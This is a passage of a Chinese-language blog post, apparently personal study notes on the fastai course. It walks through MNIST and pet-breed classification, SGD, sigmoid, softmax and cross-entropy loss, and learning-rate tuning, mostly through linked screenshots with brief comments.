src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/5.png"></p><h2 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/6.png"></p><h2 id="创建混淆矩阵"><a href="#创建混淆矩阵" class="headerlink" title="创建混淆矩阵"></a>创建混淆矩阵</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/7.png"></p><h2 id="查看预测错误的和置信度最低的5个图"><a href="#查看预测错误的和置信度最低的5个图" class="headerlink" title="查看预测错误的和置信度最低的5个图"></a>查看预测错误的和置信度最低的5个图</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/8.png"></p><h2 id="数据清洗"><a href="#数据清洗" class="headerlink" title="数据清洗"></a>数据清洗</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/9.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#之后再重新训练</span></span><br></pre></td></tr></table></figure><h2 id="加载训练好的模型"><a href="#加载训练好的模型" class="headerlink" title="加载训练好的模型"></a>加载训练好的模型</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/10.png"></p><h2 id="查看输出tensor的映射关系"><a href="#查看输出tensor的映射关系" class="headerlink" title="查看输出tensor的映射关系"></a>查看输出tensor的映射关系</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/11.png"></p><h2 id="使用notebook创建应用"><a href="#使用notebook创建应用" class="headerlink" title="使用notebook创建应用"></a>使用notebook创建应用</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/12.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/13.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/14.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/15.png"></p><h3 id="Turning-your-notebook-into-a-real-app"><a href="#Turning-your-notebook-into-a-real-app" class="headerlink" title="Turning your notebook into a real app"></a>Turning your notebook into a real app</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/16.png"><br>把需要的代码拷贝到新的notebook文件里<br>把网址里的notebooks换成volla<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/17.png"><br>再使用binder即可发布<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/18.png"></p><h1 id="再来看个更具体的例子——手写数字识别"><a href="#再来看个更具体的例子——手写数字识别" class="headerlink" title="再来看个更具体的例子——手写数字识别"></a>再来看个更具体的例子——手写数字识别</h1><h2 id="首先获取path"><a href="#首先获取path" class="headerlink" title="首先获取path"></a>首先获取path</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/19.png"></p><h2 id="为了方便显示，隐藏父文件夹"><a href="#为了方便显示，隐藏父文件夹" class="headerlink" title="为了方便显示，隐藏父文件夹"></a>为了方便显示，隐藏父文件夹</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/20.png"></p><h2 id="查看路径下文件"><a href="#查看路径下文件" class="headerlink" title="查看路径下文件"></a>查看路径下文件</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/21.png"></p><h2 id="获取帮助"><a href="#获取帮助" class="headerlink" title="获取帮助"></a>获取帮助</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/22.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/23.png"><br>打两个？可以获得source code<br>还可以doc（path.ls)查看官方文档</p><h2 id="继续查看"><a href="#继续查看" class="headerlink" title="继续查看"></a>继续查看</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/24.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/25.png"></p><h2 id="转换成numpy数组和pytorch数组"><a href="#转换成numpy数组和pytorch数组" class="headerlink" title="转换成numpy数组和pytorch数组"></a>转换成numpy数组和pytorch数组</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/26.png"><br>这两个的区别就在于tensor可以用GPU并行计算</p><h2 id="转换成pd查看背景梯度"><a href="#转换成pd查看背景梯度" class="headerlink" title="转换成pd查看背景梯度"></a>转换成pd查看背景梯度</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/27.png"></p><h2 id="Baseline-用每张3和7的均值和需要预测的图作比较，看哪个更接近"><a href="#Baseline-用每张3和7的均值和需要预测的图作比较，看哪个更接近" class="headerlink" title="Baseline-用每张3和7的均值和需要预测的图作比较，看哪个更接近"></a>Baseline-用每张3和7的均值和需要预测的图作比较，看哪个更接近</h2><h3 id="图转换成tensor"><a href="#图转换成tensor" class="headerlink" title="图转换成tensor"></a>图转换成tensor</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/28.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/29.png"></p><h3 id="把列表里的元素堆叠起来"><a href="#把列表里的元素堆叠起来" class="headerlink" title="把列表里的元素堆叠起来"></a>把列表里的元素堆叠起来</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/30.png"><br>这里要/255做标准化</p><h3 id="查看维度"><a href="#查看维度" class="headerlink" title="查看维度"></a>查看维度</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/31.png"><br>shape就是一个包含张量在每个坐标方向上尺寸的列表<br>阶就是张量忠坐标轴或者维度的数量</p><h3 id="沿着一个维度取均值"><a href="#沿着一个维度取均值" class="headerlink" title="沿着一个维度取均值"></a>沿着一个维度取均值</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/32.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/33.png"></p><h3 id="用L1或L2范数求差异"><a href="#用L1或L2范数求差异" class="headerlink" title="用L1或L2范数求差异"></a>用L1或L2范数求差异</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/34.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/35.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/36.png"><br>或者是<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/37.png"></p><h3 id="查看pytorch中tensor的type"><a href="#查看pytorch中tensor的type" class="headerlink" title="查看pytorch中tensor的type"></a>查看pytorch中tensor的type</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/38.png"></p><h3 id="测试效果"><a href="#测试效果" class="headerlink" title="测试效果"></a>测试效果</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/39.png"></p><h4 id="定义损失函数"><a href="#定义损失函数" class="headerlink" title="定义损失函数"></a>定义损失函数</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/40.png"></p><h4 id="对验证集中的每个元素都求L1范数（广播机制）"><a href="#对验证集中的每个元素都求L1范数（广播机制）" class="headerlink" title="对验证集中的每个元素都求L1范数（广播机制）"></a>对验证集中的每个元素都求L1范数（广播机制）</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/41.png"></p><h4 id="判断"><a href="#判断" class="headerlink" title="判断"></a>判断</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/42.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/43.png"></p><h4 id="准确率"><a href="#准确率" class="headerlink" title="准确率"></a>准确率</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/44.png"></p><h2 id="SGD"><a href="#SGD" class="headerlink" title="SGD"></a>SGD</h2><h3 id="计算梯度"><a href="#计算梯度" class="headerlink" title="计算梯度"></a>计算梯度</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/45.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/46.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/47.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/48.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/49.png"></p><h3 id="使用学习率"><a href="#使用学习率" class="headerlink" title="使用学习率"></a>使用学习率</h3><p>The learning rate is often a number between 0.001 and 0.1, although it could be anything.<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/50.png"></p><h3 id="An-End-to-End-SGD-Example"><a href="#An-End-to-End-SGD-Example" class="headerlink" title="An End-to-End SGD Example"></a>An End-to-End SGD Example</h3><h4 id="生成数据"><a href="#生成数据" class="headerlink" title="生成数据"></a>生成数据</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/51.png"></p><h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/52.png"></p><h4 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/53.png"></p><h4 id="Initialize-the-parameters"><a href="#Initialize-the-parameters" class="headerlink" title="Initialize the parameters"></a>Initialize the parameters</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/54.png"></p><h4 id="Calculate-the-predictions"><a href="#Calculate-the-predictions" class="headerlink" title="Calculate the predictions"></a>Calculate the predictions</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/55.png"></p><h4 id="Calculate-the-loss"><a href="#Calculate-the-loss" class="headerlink" title="Calculate the loss"></a>Calculate the loss</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/56.png"></p><h4 id="Calculate-the-gradients"><a href="#Calculate-the-gradients" class="headerlink" title="Calculate the gradients"></a>Calculate the gradients</h4><h4 id=""><a href="#" class="headerlink" title=""></a><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/57.png"></h4><h4 id="Step-the-weights"><a href="#Step-the-weights" class="headerlink" title="Step the weights."></a>Step the weights.</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/58.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/59.png"></p><h4 id="Repeat-the-process"><a href="#Repeat-the-process" class="headerlink" title="Repeat the process"></a>Repeat the process</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/60.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/61.png"></p><h4 id="stop"><a href="#stop" class="headerlink" title="stop"></a>stop</h4><p>We just decided to stop after 10 epochs arbitrarily. In practice, we would watch the training and validation losses and our metrics to decide when to stop, as we’ve discussed.</p><h2 id="The-MNIST-Loss-Function"><a href="#The-MNIST-Loss-Function" class="headerlink" title="The MNIST Loss Function"></a>The MNIST Loss Function</h2><h3 id="查看准确率的梯度"><a href="#查看准确率的梯度" class="headerlink" title="查看准确率的梯度"></a>查看准确率的梯度</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/62.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/63.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/64.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">view(-<span class="number">1</span>,<span class="number">28</span>*<span class="number">28</span>)</span><br><span class="line">-<span class="number">1</span>表示自动适应</span><br><span class="line"></span><br><span class="line">unsqueeze(<span class="number">1</span>)</span><br><span class="line">表示在第二个维度上扩展一维</span><br></pre></td></tr></table></figure><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/65.png"><br>注意这里实际上是<br>definit_params(size, std=1.0):return(torch.randn(size)*std).requires_grad_()，也就是要保留权重的梯度<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/66.png"></p><h3 id="矩阵乘法"><a href="#矩阵乘法" class="headerlink" title="矩阵乘法"></a>矩阵乘法</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/67.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/68.png"></p><h3 id="item-解开张量"><a href="#item-解开张量" class="headerlink" title="item()解开张量"></a>item()解开张量</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/69.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/70.png"><br>x变化后，output无变化，梯度为0<br>所以用准确率函数当损失函数不稳定，很多地方梯度都是0</p><h3 id="另一种损失函数"><a href="#另一种损失函数" class="headerlink" title="另一种损失函数"></a>另一种损失函数</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/71.png"><br>目标是1的话，那损失就是1-predictions，如果目标是0的话，那损失就是predictions<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/72.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/73.png"><br>上述损失函数只接受0-1范围的输入，如何解决？</p><h3 id="sigmoid"><a href="#sigmoid" class="headerlink" title="sigmoid"></a>sigmoid</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/74.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/75.png"></p><h3 id="综上"><a href="#综上" class="headerlink" title="综上"></a>综上</h3><p>我们真正关心的计时准确率，但是用准确率往往拿不到梯度，所以引出了一个有较好梯度的损失函数（准确率有时候也可以当损失函数）</p><h3 id="mini-batch"><a href="#mini-batch" class="headerlink" title="mini-batch"></a>mini-batch</h3><p>含义其实就是若干条数据，他的大小叫做batchsize<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/76.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/77.png"><br>最后一个batch的size可能会小于设定数</p><h2 id="Putting-it-all-together"><a href="#Putting-it-all-together" class="headerlink" title="Putting it all together"></a>Putting it all together</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/78.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/79.png"><br>其中first是fastai函数，取出迭代器中的第一个元素<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/80.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/81.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/82.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/83.png"><br>梯度会被累加，所以要清零。</p><h5 id="记住下划线意味着函数直接对原始对象进行修改"><a href="#记住下划线意味着函数直接对原始对象进行修改" class="headerlink" title="记住下划线意味着函数直接对原始对象进行修改"></a>记住下划线意味着函数直接对原始对象进行修改</h5><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/84.png"></p><h3 id="SGD随机梯度下降的循环"><a href="#SGD随机梯度下降的循环" class="headerlink" title="SGD随机梯度下降的循环"></a>SGD随机梯度下降的循环</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/85.png"><br>因为这一步时不需要计算梯度，所以要用p.data而不是p<br>xb的shape是256<em>28</em>28</p><h3 id="梯度下降和随机梯度下降的区别"><a href="#梯度下降和随机梯度下降的区别" class="headerlink" title="梯度下降和随机梯度下降的区别"></a>梯度下降和随机梯度下降的区别</h3><p>随机梯度下降有mini-batch，即贯穿每个小批次的循环<br>对于梯度下降，它每次都是针对整个数据集的(没有for循环，一次性用数据集所有数据算梯度)</p><h3 id="准确率-1"><a href="#准确率-1" class="headerlink" title="准确率"></a>准确率</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/86.png"><br>sigmoid的值域是（0，1），所以用0.5分界</p><h3 id="验证集准确率"><a href="#验证集准确率" class="headerlink" title="验证集准确率"></a>验证集准确率</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/87.png"><br>round用于保留4位小数</p><h3 id="一个epoch"><a href="#一个epoch" class="headerlink" title="一个epoch"></a>一个epoch</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/88.png"></p><h3 id="二十个epoch"><a href="#二十个epoch" class="headerlink" title="二十个epoch"></a>二十个epoch</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/89.png"></p><h2 id="做一些简化——创建优化器"><a href="#做一些简化——创建优化器" class="headerlink" title="做一些简化——创建优化器"></a>做一些简化——创建优化器</h2><p>首先要做的就是放弃linear（）<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/90.png"><br>他被当做函数调用时，有着和linear（）一样的功能，他能自动创建并且初始化权值（包扩bias），并自动保留梯度。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/91.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/92.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/93.png"><br>对比：<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/94.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/95.png"><br>实际使用时用<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/96.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/97.png"><br>训练集中的数据会被打乱但是验证集里不会</p><h3 id="学习器类"><a href="#学习器类" class="headerlink" title="学习器类"></a>学习器类</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/98.png"><br>他会调用<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/99.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/100.png"></p><h2 id="Adding-a-Nonlinearity——ReLu"><a href="#Adding-a-Nonlinearity——ReLu" class="headerlink" title="Adding a Nonlinearity——ReLu"></a>Adding a Nonlinearity——ReLu</h2><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/101.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/102.png"><br>relu就是<img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/103.png">这一行<br>加relu是为了增强拟合能力，不然只有先线性测层的话，多个线性层可以转化成为一个线性层。（通用近似定理）<br>当然因为梯度是逐层传递的，relu会出现梯度为0的情况，导致很多神经元失活浪费算力。<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/104.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/105.png"><br>最后输出的是1个数，因为<br>输入是1<em>28</em>28，第一次矩阵运算（1，28<em>28）@ （28</em>28，30）<br>第二次矩阵运算（1，30）     @  （30，1）<br>相当于是先整理了30个线性特征，再把这30个特征又综合了一下<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/106.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/107.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/108.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/109.png"><br>最后一行的第3列：准确率</p><h3 id="查看模型"><a href="#查看模型" class="headerlink" title="查看模型"></a>查看模型</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/110.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/111.png"></p><h3 id="查看特征图像"><a href="#查看特征图像" class="headerlink" title="查看特征图像"></a>查看特征图像</h3><p>w是30<em>28</em>28<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/112.png"></p><h3 id="用fastai试试"><a href="#用fastai试试" class="headerlink" title="用fastai试试"></a>用fastai试试</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/113.png"></p><h3 id="jargon"><a href="#jargon" class="headerlink" title="jargon"></a>jargon</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/114.png"></p><h1 id="Image-Classification"><a href="#Image-Classification" class="headerlink" title="Image Classification"></a>Image Classification</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/115.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/116.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/117.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/118.png"><br>fastai中大多数返回集合的函数和方法都使用一个名为L的类<br>L可以被认为是普通Python列表类型的增强版本，为普通操作增加了便利。<br>比如在开头就说明了有7394个元素。</p><h2 id="任务：分辨pets品种"><a href="#任务：分辨pets品种" class="headerlink" title="任务：分辨pets品种"></a>任务：分辨pets品种</h2><h3 id="演示正则表达式"><a href="#演示正则表达式" class="headerlink" title="演示正则表达式"></a>演示正则表达式</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/119.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/120.png"></p><h3 id="加载数据"><a href="#加载数据" class="headerlink" title="加载数据"></a>加载数据</h3><p>其中独立变量是图像t因变量是种类(categoryBlock)<br>使用path里文件们的name属性<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/121.png"><br>接下来这一步是<br>Presizing<br>预先定尺寸</p><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/122.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/123.png"><br>下图中左图为fastai处理效果<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/124.png"></p><h3 id="Checking-and-Debugging-a-DataBlock"><a href="#Checking-and-Debugging-a-DataBlock" class="headerlink" title="Checking and Debugging a DataBlock"></a>Checking and Debugging a DataBlock</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/125.png"></p><h4 id="加上unique查看同一只狗"><a href="#加上unique查看同一只狗" class="headerlink" title="加上unique查看同一只狗"></a>加上unique查看同一只狗</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/126.png"></p><h3 id="一个调试工具"><a href="#一个调试工具" class="headerlink" title="一个调试工具"></a>一个调试工具</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/127.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/128.png"><br>（比报错显示的好</p><h3 id="训练一下"><a href="#训练一下" class="headerlink" title="训练一下"></a>训练一下</h3><p>fastai会自动选择合适的损失函数<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/129.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/130.png"></p><h3 id="Cross-Entropy-Loss"><a href="#Cross-Entropy-Loss" class="headerlink" title="Cross-Entropy Loss"></a>Cross-Entropy Loss</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/131.png"></p><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/132.png"><br>下图里面的dl是个参数<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/133.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/134.png"><br>可以看到每个概率的和是1，这是通过softmax做到的</p><h3 id="softmax"><a href="#softmax" class="headerlink" title="softmax"></a>softmax</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/135.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/136.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/137.png"><br>可以看到他们的和并不是1<br>只能分别代表对3和7的置信度<br>对两个预测值做差再sigmoid得到对3（大概率的那个数）的概率，1-这个概率得到对7的概率</p><h3 id="扩展到多个类别"><a href="#扩展到多个类别" class="headerlink" title="扩展到多个类别"></a>扩展到多个类别</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/138.png"><br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/139.png"><br>因为这里的每一个值都是除以总和得到的所以它们相加会等于1</p><h3 id="Log-Likelihood"><a href="#Log-Likelihood" class="headerlink" title="Log Likelihood"></a>Log Likelihood</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/140.png"><br>以上是softmax之后的值<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/141.png"><br>第一项表示的是返回第几行<br>第二项表示的是返回该行的第几列元素<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/142.png"></p><h1 id="这里的loss计算方式存疑"><a href="#这里的loss计算方式存疑" class="headerlink" title="这里的loss计算方式存疑"></a>这里的loss计算方式存疑</h1><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/143.png"><br>取负号是因为想让损失函数是负的</p><h3 id="取对数"><a href="#取对数" class="headerlink" title="取对数"></a>取对数</h3><p>增大损失之间的差异</p><p>当我们首先取softmax，然后取它的对数似然，这个组合叫做交叉熵损失。在PyTorch中，这可以作为nn.CrossEntropyLoss使用（实际上，它执行log_softmax，然后是nll_loss）：<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/144.png"><br>以上两种写法都可以<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/145.png"><br>以上为查看取均值之前的tensor</p><h4 id="为什么损失函数值是负数"><a href="#为什么损失函数值是负数" class="headerlink" title="为什么损失函数值是负数"></a><del>为什么损失函数值是负数</del></h4><h3 id="查看混淆矩阵"><a href="#查看混淆矩阵" class="headerlink" title="查看混淆矩阵"></a>查看混淆矩阵</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/146.png"></p><h3 id="查看容易混淆的类别"><a href="#查看容易混淆的类别" class="headerlink" title="查看容易混淆的类别"></a>查看容易混淆的类别</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/147.png"></p><h2 id="Improving-Our-Model"><a href="#Improving-Our-Model" class="headerlink" title="Improving Our Model"></a>Improving Our Model</h2><h4 id="调大学习率"><a href="#调大学习率" class="headerlink" title="调大学习率"></a>调大学习率</h4><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/148.png"><br>可以看到损失增加</p><h3 id="寻找合适的学习率"><a href="#寻找合适的学习率" class="headerlink" title="寻找合适的学习率"></a>寻找合适的学习率</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/149.png"><br>选择下图这两个值之间的比较好<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/150.png"></p><h3 id="fine-tune"><a href="#fine-tune" class="headerlink" title="fine_tune"></a>fine_tune</h3><p><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/151.png"><br>一开始先冻结，只有最后一层的参数时可训练的<br>解冻之后所有参数都可以训练<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/152.png"><br>注意cnn_learner默认会冻结预训练模型<br>上图中是对最后一层的参数训练了3轮<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/153.png"><br>此时的learning_rate可能已经不是最优解了，所以再调用一次<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/154.png"><br>尝试找出模型表现开始再次变差的点<br>选取比这个值小数十倍的值<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/155.png"><br>在这里还能训练的更好，因为最后一层只训练了三轮，需要对最后一层再多训练，所以要设置不同的学习率<br>神经网络中不同层应该用不同的学习率来进行训练<br><img src="http://106.12.125.218/medias/medias/fastai%E6%95%99%E7%A8%8B/156.png"></p><ul><li>在fastai中这个的意思是在第一层的学习率是1e-6，而最后一层的学习率是1e-4，其他中间层的学习率会是他们中间的一些值</li><li>learn.fit_one_cycle(12, lr_max=slice(1e-6,1e-4))的前1/3的batchs学习率逐渐增大，之后逐渐减小</li></ul><p><img 